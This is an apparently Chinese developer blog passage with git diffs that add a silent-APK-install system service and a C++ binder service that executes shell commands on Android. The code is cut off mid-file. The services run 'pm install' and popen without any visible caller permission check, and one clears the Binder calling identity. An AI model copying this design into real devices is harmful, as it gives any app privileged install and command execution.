href="mailto:&#x72;&#107;&#x37;&#x31;&#x2d;&#102;&#114;&#x61;&#x6d;&#101;&#119;&#111;&#x72;&#x6b;&#45;&#98;&#97;&#x73;&#101;&#x40;&#x55;&#x73;&#101;&#x5f;&#83;&#101;&#x72;&#x76;&#x69;&#x63;&#101;&#77;&#97;&#110;&#97;&#103;&#101;&#x72;&#x5f;&#112;&#x65;&#114;&#109;&#x69;&#115;&#115;&#105;&#111;&#x6e;&#x73;&#95;&#102;&#x6f;&#x72;&#x5f;&#x41;&#x49;&#x44;&#x4c;&#95;&#x63;&#x6f;&#x6d;&#x6d;&#117;&#110;&#105;&#99;&#x61;&#116;&#105;&#x6f;&#110;&#x2e;&#112;&#97;&#116;&#x63;&#x68;">&#x72;&#107;&#x37;&#x31;&#x2d;&#102;&#114;&#x61;&#x6d;&#101;&#119;&#111;&#x72;&#x6b;&#45;&#98;&#97;&#x73;&#101;&#x40;&#x55;&#x73;&#101;&#x5f;&#83;&#101;&#x72;&#x76;&#x69;&#x63;&#101;&#77;&#97;&#110;&#97;&#103;&#101;&#x72;&#x5f;&#112;&#x65;&#114;&#109;&#x69;&#115;&#115;&#105;&#111;&#x6e;&#x73;&#95;&#102;&#x6f;&#x72;&#x5f;&#x41;&#x49;&#x44;&#x4c;&#95;&#x63;&#x6f;&#x6d;&#x6d;&#117;&#110;&#105;&#99;&#x61;&#116;&#105;&#x6f;&#110;&#x2e;&#112;&#97;&#116;&#x63;&#x68;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/Android.mk b/Android.mk</span><br><span class="line">index ad4ad997f25..0777dd24bb0 100755</span><br><span class="line">--- a/Android.mk</span><br><span class="line">+++ b/Android.mk</span><br><span class="line">@@ -83,6 +83,7 @@ LOCAL_SRC_FILES += \</span><br><span class="line"> core/java/android/app/ISearchManagerCallback.aidl \</span><br><span class="line"> core/java/android/app/IServiceConnection.aidl \</span><br><span class="line"> core/java/android/app/IStopUserCallback.aidl \</span><br><span class="line">+core/java/android/app/IInstallService.aidl \</span><br><span class="line"> core/java/android/app/job/IJobCallback.aidl \</span><br><span class="line"> core/java/android/app/job/IJobScheduler.aidl \</span><br><span class="line"> core/java/android/app/job/IJobService.aidl \</span><br><span class="line">diff --git a/core/java/android/app/IInstallService.aidl b/core/java/android/app/IInstallService.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..92787763ef5</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/IInstallService.aidl</span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+package android.app;</span><br><span class="line">+</span><br><span class="line">+interface IInstallService &#123;</span><br><span class="line">+    void installApk(String apkFilePath, String packageName);</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-2-实现AIDL接口"><a href="#2-2-实现AIDL接口" class="headerlink" title="2.2 实现AIDL接口"></a>2.2 实现AIDL接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/app/InstallService.java b/core/java/android/app/InstallService.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..f1e0fb014aa</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/InstallService.java</span><br><span class="line">@@ -0,0 +1,41 @@</span><br><span class="line">+package android.app;</span><br><span class="line">+</span><br><span class="line">+import android.app.Service;</span><br><span class="line">+import android.content.Intent;</span><br><span class="line">+import android.os.IBinder;</span><br><span class="line">+import android.os.RemoteException;</span><br><span class="line">+import android.util.Log;</span><br><span class="line">+import android.app.IInstallService;</span><br><span class="line">+import java.io.BufferedReader;</span><br><span class="line">+import java.io.InputStreamReader;</span><br><span class="line">+</span><br><span class="line">+public class InstallService extends IInstallService.Stub &#123;</span><br><span class="line">+</span><br><span class="line">+    @Override</span><br><span class="line">+    public void installApk(String apkPath,String packageName) throws RemoteException &#123;</span><br><span class="line">+        try &#123;</span><br><span class="line">+            Log.d(&quot;server&quot;, &quot;installApk: &quot; + apkPath);</span><br><span class="line">+            String[] cmd = new String[] &#123;&quot;pm&quot;, &quot;install&quot;, &quot;-r&quot;,&quot;-i&quot;,packageName,&quot;--user&quot;,&quot;0&quot;, apkPath&#125;;</span><br><span class="line">+            Process proc = new ProcessBuilder().command(cmd).start();</span><br><span class="line">+            int exitCode = proc.waitFor();</span><br><span class="line">+            Log.d(&quot;server&quot;, &quot;installApk: exitCode: &quot; + exitCode);</span><br><span class="line">+            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getErrorStream()));</span><br><span class="line">+            String line;</span><br><span class="line">+            while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">+                Log.e(&quot;server&quot;, &quot;installApk error: &quot; + line);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125; catch (Exception e) &#123;</span><br><span class="line">+            Log.d(&quot;server&quot;, &quot;installApk: error&quot;);</span><br><span class="line">+            e.printStackTrace();</span><br><span class="line">+        &#125;</span><br><span class="line">+        </span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br></pre></td></tr></table></figure><h3 id="2-3-将服务注册到ServiceManager-以及调用服务"><a href="#2-3-将服务注册到ServiceManager-以及调用服务" class="headerlink" title="2.3 将服务注册到ServiceManager 以及调用服务"></a>2.3 将服务注册到ServiceManager 以及调用服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/services/java/com/android/server/SystemServer.java b/services/java/com/android/server/SystemServer.java</span><br><span class="line">index 393f062717d..f74b69b612f 100644</span><br><span class="line">--- a/services/java/com/android/server/SystemServer.java</span><br><span class="line">+++ b/services/java/com/android/server/SystemServer.java</span><br><span class="line">@@ -16,6 +16,7 @@</span><br><span class="line"> </span><br><span class="line"> package com.android.server;</span><br><span class="line"> </span><br><span class="line">+import android.app.InstallService;</span><br><span class="line"> import android.app.ActivityThread;</span><br><span class="line"> import android.app.INotificationManager;</span><br><span class="line"> import android.app.usage.UsageStatsManagerInternal;</span><br><span class="line">@@ -591,6 +592,11 @@ public final class SystemServer &#123;</span><br><span class="line">             ServiceManager.addService(&quot;scheduling_policy&quot;, new SchedulingPolicyService());</span><br><span class="line">             Trace.traceEnd(Trace.TRACE_TAG_SYSTEM_SERVER);</span><br><span class="line"> </span><br><span class="line">+            traceBeginAndSlog(&quot;StartInstallService&quot;);</span><br><span class="line">+            ServiceManager.addService(Context.INSTALL_SERVICE, new InstallService());</span><br><span class="line">+            Trace.traceEnd(Trace.TRACE_TAG_SYSTEM_SERVER);</span><br><span class="line">+            </span><br><span class="line">             mSystemServiceManager.startService(TelecomLoaderService.class);</span><br><span class="line"> </span><br><span class="line">             traceBeginAndSlog(&quot;StartTelephonyRegistry&quot;);</span><br><span class="line"></span><br><span class="line">diff --git a/core/java/android/app/InstallManager.java b/core/java/android/app/InstallManager.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..2d9b3db2b06</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/InstallManager.java</span><br><span class="line">@@ -0,0 +1,24 @@</span><br><span class="line">+package android.app;</span><br><span class="line">+</span><br><span class="line">+import android.os.ServiceManager;</span><br><span class="line">+import android.app.IInstallService;</span><br><span class="line">+import android.content.Context;</span><br><span class="line">+import android.os.Binder;</span><br><span class="line">+</span><br><span class="line">+public class InstallManager &#123;</span><br><span class="line">+</span><br><span class="line">+    private IInstallService installService;</span><br><span class="line">+</span><br><span class="line">+    public InstallManager()&#123;</span><br><span class="line">+        installService = IInstallService.Stub.asInterface(ServiceManager.getService(Context.INSTALL_SERVICE));</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    public void install(String apkPath, String packageName)&#123;</span><br><span class="line">+     final long ident = Binder.clearCallingIdentity();</span><br><span class="line">+        try &#123;</span><br><span class="line">+            installService.installApk(apkPath, packageName);</span><br><span class="line">+        &#125; catch (Exception e) &#123;</span><br><span class="line">+            e.printStackTrace();</span><br><span class="line">+        &#125; finally &#123;</span><br><span class="line">+            Binder.restoreCallingIdentity(ident);</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure><h2 id="3-实现跨语言的AIDL通信。"><a href="#3-实现跨语言的AIDL通信。" class="headerlink" title="3 实现跨语言的AIDL通信。"></a>3 实现跨语言的AIDL通信。</h2><h3 id="3-1-C-实现AIDL服务端"><a href="#3-1-C-实现AIDL服务端" class="headerlink" title="3.1 C++实现AIDL服务端"></a>3.1 C++实现AIDL服务端</h3><p>这一块文件比较多,就直接添加补丁了</p><p>补丁：<a href="mailto:&#x72;&#x6b;&#55;&#x31;&#x2d;&#102;&#x72;&#x61;&#x6d;&#101;&#119;&#111;&#114;&#107;&#45;&#98;&#97;&#115;&#101;&#x40;&#x49;&#109;&#x70;&#108;&#101;&#x6d;&#x65;&#110;&#116;&#95;&#65;&#x49;&#68;&#x4c;&#x5f;&#99;&#x6f;&#109;&#x6d;&#x75;&#110;&#105;&#99;&#x61;&#116;&#x69;&#111;&#x6e;&#95;&#116;&#111;&#x5f;&#101;&#x78;&#x65;&#x63;&#x75;&#100;&#x65;&#95;&#x73;&#104;&#x65;&#x6c;&#x6c;&#46;&#x70;&#97;&#116;&#99;&#x68;">&#x72;&#x6b;&#55;&#x31;&#x2d;&#102;&#x72;&#x61;&#x6d;&#101;&#119;&#111;&#114;&#107;&#45;&#98;&#97;&#115;&#101;&#x40;&#x49;&#109;&#x70;&#108;&#101;&#x6d;&#x65;&#110;&#116;&#95;&#65;&#x49;&#68;&#x4c;&#x5f;&#99;&#x6f;&#109;&#x6d;&#x75;&#110;&#105;&#99;&#x61;&#116;&#x69;&#111;&#x6e;&#95;&#116;&#111;&#x5f;&#101;&#x78;&#x65;&#x63;&#x75;&#100;&#x65;&#95;&#x73;&#104;&#x65;&#x6c;&#x6c;&#46;&#x70;&#97;&#116;&#99;&#x68;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/techvision/Android.mk b/core/java/android/techvision/Android.mk</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..5053e7d6438</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/Android.mk</span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line">+include $(call all-subdir-makefiles)</span><br><span class="line">diff --git a/core/java/android/techvision/cmd/Android.mk b/core/java/android/techvision/cmd/Android.mk</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..64fa74374c5</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/cmd/Android.mk</span><br><span class="line">@@ -0,0 +1,32 @@</span><br><span class="line">+LOCAL_PATH:= $(call my-dir)</span><br><span class="line">+</span><br><span class="line">+include $(CLEAR_VARS)</span><br><span class="line">+</span><br><span class="line">+LOCAL_MODULE_TAGS := optional</span><br><span class="line">+LOCAL_MODULE := techvision_service </span><br><span class="line">+</span><br><span class="line">+LOCAL_SRC_FILES := \</span><br><span class="line">+    main_TechvisionService.cpp</span><br><span class="line">+</span><br><span class="line">+LOCAL_SHARED_LIBRARIES := \</span><br><span class="line">+    libutils \</span><br><span class="line">+    libbinder \</span><br><span class="line">+    liblog\</span><br><span class="line">+libtechvisionservice</span><br><span class="line">+</span><br><span class="line">+include $(BUILD_EXECUTABLE)</span><br><span class="line">+</span><br><span class="line">+include $(CLEAR_VARS)</span><br><span class="line">+LOCAL_MODULE_TAGS := optional</span><br><span class="line">+LOCAL_MODULE := techvision_client</span><br><span class="line">+</span><br><span class="line">+LOCAL_SRC_FILES := \</span><br><span class="line">+    main_TechvisionClient.cpp</span><br><span class="line">+</span><br><span class="line">+LOCAL_SHARED_LIBRARIES := \</span><br><span class="line">+    libutils \</span><br><span class="line">+    libbinder \</span><br><span class="line">+    liblog\</span><br><span class="line">+libtechvisionservice</span><br><span class="line">+</span><br><span class="line">+include $(BUILD_EXECUTABLE)</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/techvision/cmd/main_TechvisionClient.cpp b/core/java/android/techvision/cmd/main_TechvisionClient.cpp</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..dfcb41dca59</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/cmd/main_TechvisionClient.cpp</span><br><span class="line">@@ -0,0 +1,54 @@</span><br><span class="line">+//参考  frameworks/av/media/mediaserver/main_mediaserver.cpp</span><br><span class="line">+#define LOG_TAG &quot;jinnyCmdClient&quot;</span><br><span class="line">+ </span><br><span class="line">+#include &lt;binder/IBinder.h&gt;</span><br><span class="line">+#include &lt;binder/IPCThreadState.h&gt;</span><br><span class="line">+#include &lt;binder/ProcessState.h&gt;</span><br><span class="line">+#include &lt;binder/IServiceManager.h&gt;</span><br><span class="line">+#include &lt;android/app/ITechvisionService.h&gt;</span><br><span class="line">+#include &lt;android/app/BnTechvisionCallback.h&gt;</span><br><span class="line">+</span><br><span class="line">+ </span><br><span class="line">+using namespace android;</span><br><span class="line">+ </span><br><span class="line">+namespace android &#123;</span><br><span class="line">+namespace app &#123;</span><br><span class="line">+ </span><br><span class="line">+class TechvisionCallback :public BnTechvisionCallback &#123;</span><br><span class="line">+    public :</span><br><span class="line">+        bool hasMsg;</span><br><span class="line">+    virtual binder::Status onCommandCompleted(int32_t status, const String16&amp; msg) &#123;</span><br><span class="line">+            String8 msg8 = String8(msg);</span><br><span class="line">+            ALOGD(&quot;status == %d ,msg = %s&quot;, status, msg8.string());</span><br><span class="line">+            hasMsg = true;</span><br><span class="line">+            return binder::Status::ok();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">+int main(void)&#123;</span><br><span class="line">+    sp&lt;ProcessState&gt; proc(ProcessState::self());</span><br><span class="line">+    sp&lt;IServiceManager&gt; sm(defaultServiceManager());</span><br><span class="line">+    sp&lt;IBinder&gt; binder = sm-&gt;getService(String16(&quot;techvision&quot;));</span><br><span class="line">+ </span><br><span class="line">+    if(binder == 0)&#123;</span><br><span class="line">+        ALOGD(&quot;can not get service&quot;);</span><br><span class="line">+        return -1;</span><br><span class="line">+    &#125;</span><br><span class="line">+ </span><br><span class="line">+    sp&lt;android::app::ITechvisionService&gt; service = interface_cast&lt;android::app::ITechvisionService&gt;(binder);</span><br><span class="line">+    sp&lt;android::app::TechvisionCallback&gt; callback(new android::app::TechvisionCallback());</span><br><span class="line">+    </span><br><span class="line">+    int res;</span><br><span class="line">+</span><br><span class="line">+    ALOGD(&quot;registerListener&quot;);</span><br><span class="line">+    service-&gt;executeCommand(String16(&quot;ps&quot;),callback);</span><br><span class="line">+    ALOGD(&quot;------------------------------------------------------&quot;);</span><br><span class="line">+</span><br><span class="line">+    ProcessState::self()-&gt;startThreadPool();</span><br><span class="line">+    IPCThreadState::self()-&gt;joinThreadPool();</span><br><span class="line">+    return 0;</span><br><span class="line">+&#125;;</span><br><span class="line">+ </span><br><span class="line">+ </span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/techvision/cmd/main_TechvisionService.cpp b/core/java/android/techvision/cmd/main_TechvisionService.cpp</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..dabe1b46fcb</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/cmd/main_TechvisionService.cpp</span><br><span class="line">@@ -0,0 +1,27 @@</span><br><span class="line">+//参考  frameworks/av/media/mediaserver/main_mediaserver.cpp</span><br><span class="line">+#define LOG_TAG &quot;jinnyService&quot;</span><br><span class="line">+ </span><br><span class="line">+#include &lt;binder/IPCThreadState.h&gt;</span><br><span class="line">+#include &lt;binder/ProcessState.h&gt;</span><br><span class="line">+#include &lt;binder/IServiceManager.h&gt;</span><br><span class="line">+#include &quot;TechvisionService.h&quot;</span><br><span class="line">+ </span><br><span class="line">+using namespace android;</span><br><span class="line">+ </span><br><span class="line">+int main(void)&#123;</span><br><span class="line">+    signal(SIGPIPE, SIG_IGN);</span><br><span class="line">+    sp&lt;ProcessState&gt; proc(ProcessState::self());</span><br><span class="line">+ </span><br><span class="line">+    sp&lt;IServiceManager&gt; sm(defaultServiceManager());</span><br><span class="line">+ </span><br><span class="line">+    ALOGI(&quot;ServiceManager:addService %p&quot;, sm.get());</span><br><span class="line">+    android::app::TechvisionService::instantiate();</span><br><span class="line">+</span><br><span class="line">+    // sp&lt;android::hardware::TechvisionService&gt; service(new android::hardware::TechvisionService());</span><br><span class="line">+    // defaultServiceManager()-&gt;addService(service-&gt;getServiceName(), service);</span><br><span class="line">+    </span><br><span class="line">+    ProcessState::self()-&gt;startThreadPool();</span><br><span class="line">+    IPCThreadState::self()-&gt;joinThreadPool();</span><br><span class="line">+ </span><br><span class="line">+    return 0;</span><br><span class="line">+&#125;</span><br><span class="line">diff --git a/core/java/android/techvision/service/Android.mk b/core/java/android/techvision/service/Android.mk</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..708b190562b</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/service/Android.mk</span><br><span class="line">@@ -0,0 +1,27 @@</span><br><span class="line">+LOCAL_PATH:= $(call my-dir)</span><br><span class="line">+include $(CLEAR_VARS)</span><br><span class="line">+</span><br><span class="line">+LOCAL_CFLAGS += -Wno-unused-parameter</span><br><span class="line">+LOCAL_MODULE_TAGS := optional</span><br><span class="line">+LOCAL_MODULE := libtechvisionservice</span><br><span class="line">+</span><br><span class="line">+LOCAL_C_INCLUDES := \</span><br><span class="line">+    $(LOCAL_PATH) \</span><br><span class="line">+</span><br><span class="line">+LOCAL_EXPORT_C_INCLUDE_DIRS := \</span><br><span class="line">+    $(LOCAL_PATH) \</span><br><span class="line">+</span><br><span class="line">+LOCAL_AIDL_INCLUDES := \</span><br><span class="line">+    $(LOCAL_PATH)/aidl \</span><br><span class="line">+</span><br><span class="line">+LOCAL_SRC_FILES := \</span><br><span class="line">+    aidl/android/app/ITechvisionService.aidl \</span><br><span class="line">+    aidl/android/app/ITechvisionCallback.aidl \</span><br><span class="line">+    TechvisionService.cpp</span><br><span class="line">+</span><br><span class="line">+LOCAL_SHARED_LIBRARIES := \</span><br><span class="line">+    libutils \</span><br><span class="line">+    libbinder \</span><br><span class="line">+    liblog     </span><br><span class="line">+</span><br><span class="line">+include $(BUILD_SHARED_LIBRARY)</span><br><span class="line">diff --git a/core/java/android/techvision/service/TechvisionService.cpp b/core/java/android/techvision/service/TechvisionService.cpp</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..c0ce352b2d3</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/service/TechvisionService.cpp</span><br><span class="line">@@ -0,0 +1,47 @@</span><br><span class="line">+#define LOG_TAG &quot;hukaichaoService&quot;</span><br><span class="line">+#include &quot;TechvisionService.h&quot;</span><br><span class="line">+#include &lt;unistd.h&gt;</span><br><span class="line">+#include &lt;stdio.h&gt;</span><br><span class="line">+</span><br><span class="line">+using namespace android;</span><br><span class="line">+ </span><br><span class="line">+namespace android &#123;</span><br><span class="line">+namespace app &#123;</span><br><span class="line">+ </span><br><span class="line">+void TechvisionService::onFirstRef()&#123;</span><br><span class="line">+    // ALOGD(&quot;onFirstRef()&quot;);</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">+TechvisionService::TechvisionService()&#123;</span><br><span class="line">+    // ALOGD(&quot;TechvisionService()&quot;);</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">+TechvisionService::~TechvisionService()&#123;</span><br><span class="line">+    // ALOGD(&quot;~TechvisionService()&quot;);</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">+</span><br><span class="line">+binder::Status TechvisionService::executeCommand(const ::android::String16&amp; command, const sp&lt;ITechvisionCallback&gt;&amp; callback) &#123;</span><br><span class="line">+    int error = 0;</span><br><span class="line">+    FILE* pipe = popen(&quot;ps&quot;, &quot;r&quot;);</span><br><span class="line">+    if (!pipe) &#123;</span><br><span class="line">+        ALOGE(&quot;popen failed!&quot;);</span><br><span class="line">+        return binder::Status::fromServiceSpecificError(error);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    char buffer[128];</span><br><span class="line">+    std::string result = &quot;&quot;;</span><br><span class="line">+    while (fgets(buffer, sizeof(buffer), pipe) != NULL) &#123;</span><br><span class="line">+        result += buffer;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span 